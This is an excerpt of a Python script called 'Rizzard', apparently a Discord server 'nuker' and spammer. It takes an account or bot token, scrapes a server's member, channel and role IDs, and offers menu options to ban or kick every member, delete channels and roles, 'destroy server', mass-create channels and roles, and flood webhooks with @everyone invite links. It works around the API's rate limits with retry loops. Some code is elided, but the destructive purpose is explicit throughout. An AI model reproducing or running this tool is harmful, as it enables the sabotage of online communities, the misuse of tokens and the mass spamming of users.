...
{Fore.RED} Discord Spammer Python
{Fore.RED}                                                                       Rizzard#0456

''')
token = input(f'{Fore.RED}Enter Token : {Fore.GREEN}')
...
class Rizzard:
        ...
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Banned {Fore.GREEN}{member.strip()} {Fore.GREEN}")
                    break
                else:
                    break
    ...
    def KickMembers(self, guild, member):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Banned {Fore.GREEN}{member.strip()}")
                    break
                else:
                    break
    ...
    def DeleteChannels(self, guild, channel):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Deleted Channel {Fore.GREEN}{channel.strip()}")
                    break
                else:
                    break
    ...
    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
    ...
    def DeleteRoles(self, guild, role):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Role Deleted {Fore.GREEN}{role.strip()}")
                    break
                else:
                    break
    ...
    def SpamChannels(self, guild, name):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Created Channel {Fore.GREEN}{name}")
                    break
                else:
                    break
    ...
    def SpamRoles(self, guild, name):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Created Role {Fore.GREEN} {name}")
                    break
                else:
                    break
    ...
    def WebhookSend(self, webhook, message): #credits to anti
        while True:
            json = {
                'content': message if message != '' else "@everyone https://discord.gg/rS5HfVrByC",
                'tts': False,
                'username': 'Rizzard'
            }
            ...
            if r.status_code == 429:
                ...
                if r.status_code == 204 or 201 or 200:
                    print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Sent message {Fore.GREEN} {message}")
                    break
                else:
                    break
    ...
    async def SpamWebhook(self, guild_id, amount, message):
        ...
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Rizzard', reason="https://discord.gg/rS5HfVrByC")
                print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Spammed")
    ...
    async def Scrape(self):
        guild = input(f'{Fore.GREEN}[Rizzard] {Fore.RED}Server Id: {Fore.GREEN}')
        ...
        membercount = 0
        with open('Data/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{Fore.GREEN}[Rizzard] {Fore.RED}Server has {Fore.GREEN}{membercount} Members")
            m.close()

        channelcount = 0
        with open('Data/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Scrapped {Fore.GREEN}{channelcount} Channels")
            c.close()

        rolecount = 0
        with open('Data/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{Fore.GREEN}[Rizzard] {Fore.RED}Scrapped {Fore.GREEN}{rolecount} Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{Fore.GREEN}[Rizzard] {Fore.RED}Server Id: {Fore.GREEN}')
        channel_name = input(f"{Fore.GREEN}[Rizzard] {Fore.RED}Channels Name: {Fore.GREEN}")
        channel_amount = input(f"{Fore.GREEN}[Rizzard] {Fore.RED}How Many?: {Fore.GREEN}")
        role_name = input(f"{Fore.GREEN}[Rizzard] {Fore.RED}Roles Name: {Fore.GREEN}")
        role_amount = input(f"{Fore.GREEN}[Rizzard] {Fore.RED}How Many?: {Fore.GREEN}")
        print()
    ...
    async def ChannelSpamExecute(self):
        guild = input(f'{Fore.GREEN}[Rizzard] {Fore.RED}Server Id: {Fore.GREEN}')
        name = input(f"{Fore.GREEN}[Rizzard] {Fore.RED}Role Name:: {Fore.GREEN}")
        amount = input(f"{Fore.GREEN}[Rizzard] {Fore.RED}How Many?: {Fore.GREEN}")
        print()
...
''')
    ...
    async def Menu(self):
        os.system(f'cls & title Rizzard Spammer Tools V.0.1 Beta Test')
        print(f'''
...
Press 1 - scrape gliuld
Press 2 - ban all
Press 3 - webhook spam (Wait For Updates Rizzard#0456)
Press 4 - kick all
Press 5 - Delete roles
Press 6 - delete channel
Press 7 - destroy server
Press 8 - spam roles
Press 9 - spam channel 

                                
        ''')
        choice = input(f'{Fore.GREEN}[Rizzard] {Fore.RED}Number: {Fore.GREEN}')
        if choice == '2': #bans
            ...
            amount = int(input(f"{Fore.GREEN}[Rizzard] {Fore.RED}How Many?: {Fore.GREEN}"))
            guild_id = int(input(f"{Fore.GREEN}[Rizzard] {Fore.RED}Server Id: {Fore.GREEN}"))
            message = str(input(f"{Fore.GREEN}[Rizzard] {Fore.RED}Webhook Message: {Fore.GREEN}"))
    ...
    def Startup(self):
        try:
            ...
            print(f'{Fore.YELLOW}[Rizzard] {Fore.RED}Token Was Invalid {Fore.GREEN}')
            input()
            os._exit(0)
